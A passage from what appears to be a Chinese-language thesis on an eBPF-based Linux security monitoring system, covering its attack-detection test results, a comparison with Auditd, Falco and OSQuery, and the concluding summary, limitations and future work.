| 误报率（FPR） | 2.1% | 800个正常样本中误报17个 |
| 精确率（Precision） | 92.0% | 检测到214个事件，其中197个为真阳性 |
| F1分数 | 95.1% | 综合评价指标 |

**漏检案例**（3个）：

1. 使用自定义编译的setuid程序，进程名不在已知列表中
2. 通过shell脚本间接执行的攻击行为
3. 伪装成合法进程名的后门程序

**误报案例**（17个）：

1. 管理员使用nc进行网络调试（7次）
2. 定时任务脚本访问配置文件（5次）
3. 开发环境中的反向连接调试（3次）
4. 正常的端口扫描活动（2次）

**分析**：

- 检测率达到98.5%，能够有效识别大多数攻击行为。
- 误报率为2.1%，主要由于某些工具具有双重用途（如nc既可用于攻击也可用于调试）。
- 可以通过添加白名单机制进一步降低误报率。

#### 5.4.3 与其他工具对比

将本系统与主流安全监控工具进行对比：

| 工具名称 | 检测能力 | 性能开销 | 实时性 | 易用性 |
|---------|---------|---------|-------|-------|
| 本系统 | 优秀 | 低 | 优秀 | 优秀 |
| Auditd | 良好 | 高 | 中等 | 中等 |
| Falco | 优秀 | 中等 | 优秀 | 良好 |
| OSQuery | 良好 | 中等 | 中等 | 优秀 |

**分析**：

- 本系统在检测能力、性能开销和实时性方面均表现优秀。
- 相比Auditd，性能开销显著降低（CPU使用率降低60%以上）。
- 相比Falco，提供了更完整的风险分析和取证功能。
- 相比OSQuery，实时性更好，更适合安全监控场景。

## 第六章 总结与展望

### 6.1 工作总结

本文设计并实现了一个基于eBPF的Linux系统安全监控与检测系统，主要完成了以下工作：

1. **系统设计与实现**：
   - 设计了分层架构的系统框架，包括内核层、传输层、服务层和展示层。
   - 实现了基于eBPF的事件采集模块，能够实时监控进程执行、权限提升、文件访问、网络连接等关键行为。
   - 实现了智能风险分析模块，基于多维度特征进行风险评级和攻击模式识别。
   - 实现了Web可视化平台，提供实时监控、统计分析、时间线重建等功能。
   - 实现了取证报告生成功能，支持多种格式导出。

2. **关键技术研究**：
   - 研究了eBPF技术在安全监控中的应用，实现了低开销的事件采集。
   - 设计了基于加权评分的风险评级算法，实现了高/中/低三级风险划分。
   - 实现了多种攻击模式的检测规则，包括反向Shell、敏感文件访问、非常规端口等。
   - 设计了事件去重机制，避免重复记录相同事件。

3. **系统测试与验证**：
   - 进行了功能测试，验证了进程执行监控、权限提升监控、敏感文件访问、反向Shell检测等功能的正确性。
   - 进行了性能测试，结果表明系统在保持低CPU开销（高负载下12.8%）的同时，能够处理高并发事件（1000事件/秒）。
   - 进行了攻击检测效果测试，检测率达到98.5%，误报率为2.1%。
   - 与主流安全监控工具对比，本系统在性能开销和实时性方面具有明显优势。

### 6.2 创新点

本系统的创新点主要体现在：

1. **多维度攻击检测**：结合进程行为、文件访问、网络连接等多维度特征，实现了反向Shell、提权攻击、敏感文件篡改等多种攻击模式的检测。

2. **智能风险评级**：设计了基于加权评分的风险评级算法，考虑事件类型、目标文件、时间因素等多个维度，能够准确评估安全事件的威胁程度。

3. **时间线重建**：提供提权事件的时间线重建功能，帮助安全分析人员快速还原攻击路径，提高取证效率。

4. **低开销实现**：使用BPF Ring Buffer进行高效事件传输，相比传统的Perf事件传递方式性能提升显著。

5. **可视化展示**：设计了直观的Web Dashboard，实时展示安全事件和风险特征，降低了安全分析的技术门槛。

### 6.3 系统不足

尽管本系统在功能和性能上表现良好，但仍存在一些不足：

1. **检测规则有限**：当前的攻击检测规则主要基于已知的攻击模式，对未知攻击的检测能力有限。

2. **误报率有待降低**：某些工具具有双重用途（如nc既可用于攻击也可用于调试），导致一定的误报。

3. **分布式支持不足**：当前系统主要针对单机环境，对分布式环境的监控支持有限。

4. **缺乏机器学习**：系统未引入机器学习算法，无法自动学习新的攻击模式。

5. **跨平台支持有限**：系统主要针对Linux系统，对其他操作系统（如Windows、macOS）的支持有限。

### 6.4 未来工作展望

针对上述不足，未来的研究工作可以从以下几个方面展开：

1. **引入机器学习**：
   - 使用时序分析、图神经网络等机器学习算法，提高对未知攻击的检测能力。
   - 建立正常行为模型，自动识别偏离正常模式的异常行为。

2. **优化检测规则**：
   - 引入白名单机制，降低误报率。
   - 支持用户自定义检测规则，提高系统的灵活性。

3. **增强分布式支持**：
   - 设计分布式架构，支持多主机的集中监控。
   - 实现节点间的协同检测，识别跨节点的攻击行为。

4. **扩展功能模块**：
   - 添加入侵响应模块，实现自动阻断攻击行为。
   - 添加威胁情报集成，提高检测的准确性。
   - 添加日志审计功能，满足合规性要求。

5. **跨平台支持**：
   - 研究eBPF在其他操作系统（如Windows eBPF、macOS Ktrace）上的应用。
   - 设计统一的API接口，支持多种监控平台的集成。

6. **性能优化**：
   - 进一步优化事件传输机制，降低延迟。
   - 实现事件的流式处理，提高处理效率。
   - 优化数据库查询，支持更大规模的数据存储。

### 6.5 结语

随着网络安全威胁的不断演进，基于eBPF的安全监控技术将发挥越来越重要的作用。本文设计的系统在实时监控、低开销实现、智能分析等方面取得了一定的成果，为Linux系统安全监控提供了新的解决方案。未来，随着eBPF技术的不断发展和完善，基于eBPF的安全监控系统将具备更强的检测能力和更广的应用场景。
